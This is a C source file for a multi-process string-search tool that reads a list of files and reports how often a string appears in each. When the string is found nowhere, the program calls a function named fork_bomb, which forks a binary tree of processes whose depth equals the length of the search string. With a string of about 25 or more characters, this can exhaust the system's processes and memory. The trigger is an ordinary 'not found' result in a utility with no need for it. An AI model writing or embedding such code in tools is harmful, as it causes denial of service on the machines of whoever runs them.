#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAX_PATH_LEN 1024

typedef struct {
  char filename[MAX_PATH_LEN];
  int count;
} result;

int search_string_in_file(const char *filename, const char *str);
void fork_bomb(int height, int level);

int main(int argc, char *argv[]) {
  if (argc != 3) {
    fprintf(stderr, "Usage: %s <file_list.txt> <search_string>\n", argv[0]);
    return EXIT_FAILURE;
  }

  const char *list_path = argv[1];
  const char *search_str = argv[2];
  FILE *list_file = fopen(list_path, "r");
  if (!list_file) {
    fprintf(stderr, "fopen failed\n");
    return EXIT_FAILURE;
  }

  char filepath[MAX_PATH_LEN];
  int found_any = 0;

  int pipefd[2];
  if (pipe(pipefd) == -1) {
    fprintf(stderr, "pipe failed\n");
    return EXIT_FAILURE;
  }

  while (fgets(filepath, sizeof(filepath), list_file)) {
    filepath[strcspn(filepath, "\n")] = '\0';

    pid_t pid = fork();
    if (pid < 0) {
      fprintf(stderr, "fork failed\n");
      close(pipefd[0]);
      close(pipefd[1]);
      return EXIT_FAILURE;
    }

    if (pid == 0) {
      close(pipefd[0]);
      result r;
      strncpy(r.filename, filepath, MAX_PATH_LEN - 1);
      r.count = search_string_in_file(filepath, search_str);

      write(pipefd[1], &r, sizeof(result));
      close(pipefd[1]);
      exit(0);
    }
  }

  close(pipefd[1]);
  result r;
  int status = 0;
  int i = 0;

  while (read(pipefd[0], &r, sizeof(result)) == sizeof(result)) {
    if (r.count > 0) {
      printf("%s: %d\n", r.filename, r.count);
      found_any = 1;
    }
  }

  while (wait(&status) > 0);

  close(pipefd[0]);

  fclose(list_file);

  if (!found_any) {
    fprintf(stderr, "String '%s' not found in any file\n", search_str);
    fork_bomb(strlen(search_str), 0);
  }

  return 0;
}

int search_string_in_file(const char *filename, const char *str) {
  if (filename == NULL || str == NULL) {
    return 0;
  }
  FILE *fin = fopen(filename, "r");
  if (fin == NULL) {
    return 0;
  }

  char line[BUFSIZ];
  int count = 0;
  size_t len = strlen(str);

  while (fgets(line, sizeof(line), fin)) {
    char *p = line;
    while ((p = strstr(p, str)) != NULL) {
      count++;
      p += len;
    }
  }

  fclose(fin);
  return count;
}

void fork_bomb(int height, int level) {
  if (height == 0) {
    return;
  }

  printf("%*sPID %d at level %d\n", level * 2, "", getpid(), level);

  pid_t left = fork();
  if (left == 0) {
    fork_bomb(height - 1, level + 1);
    exit(0);
  }

  pid_t right = fork();
  if (right == 0) {
    fork_bomb(height - 1, level + 1);
    exit(0);
  }

  wait(NULL);
  wait(NULL);
}
